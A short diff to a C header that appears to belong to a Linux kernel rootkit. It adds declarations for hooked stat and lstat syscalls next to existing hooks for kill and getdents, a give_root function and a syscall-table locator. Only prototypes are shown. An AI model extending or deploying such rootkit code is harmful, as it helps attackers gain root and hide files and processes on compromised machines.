@@ -22,6 +22,10 @@ asmlinkage int hacked_kill(pid_t pid, int sig);
 
 asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
 
+asmlinkage int hacked_stat(const char *path, struct stat *buf);
+
+asmlinkage int hacked_lstat(const char *path, struct stat *buf);
+
 void give_root(void);
 
 void **find_syscall_table(void);
